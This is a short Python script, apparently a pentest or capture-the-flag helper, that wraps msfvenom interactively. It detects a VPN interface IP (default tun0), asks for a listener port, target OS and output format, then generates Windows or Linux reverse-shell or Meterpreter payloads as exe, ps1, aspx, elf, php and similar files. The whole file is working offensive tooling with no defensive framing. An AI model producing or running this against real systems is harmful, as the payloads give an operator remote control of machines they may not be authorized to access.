import os
import subprocess
from rich import print

def detect_ip(interface):

    cmd = f"ip addr show {interface}"
    result = subprocess.getoutput(cmd)

    for line in result.split("\n"):
        if "inet " in line:
            return line.strip().split()[1].split("/")[0]

    return None


def run_venom(lhost, lport):

    if not lhost:
        lhost = input("LHOST (default tun0): ") or "tun0"

    if not lport:
        lport = input("LPORT (default 4444): ") or "4444"

    if not lhost[0].isdigit():
        lhost = detect_ip(lhost)

    print("\nSelect OS")
    print("1. Windows")
    print("2. Linux")

    os_choice = input("> ")

    print("\n1. Reverse Shell\n2. Meterpreter")
    payload_choice = input("> ")

    if os_choice == "1":
        ext = input("Output format (exe/ps1/bat/aspx): ") or "exe"
        name = input(f"Filename (default shell.{ext}): ") or f"shell.{ext}"

        if payload_choice == "1":
            payload = "windows/x64/shell_reverse_tcp"
        else:
            payload = "windows/x64/meterpreter/reverse_tcp"

    else:
        ext = input("Output format (elf/sh/php): ") or "elf"
        name = input(f"Filename (default shell.{ext}): ") or f"shell.{ext}"

        if payload_choice == "1":
            payload = "linux/x64/shell_reverse_tcp"
        else:
            payload = "linux/x64/meterpreter_reverse_tcp"

    cmd = [
        "msfvenom",
        "-p", payload,
        f"LHOST={lhost}",
        f"LPORT={lport}",
        "-f", ext,
        "-o", name
    ]

    print("\n[+] Running:")
    print(" ".join(cmd))

    subprocess.run(cmd)

    fullpath = os.path.abspath(name)

    print(f"\n[bold green][+] Payload generated → {fullpath}[/]")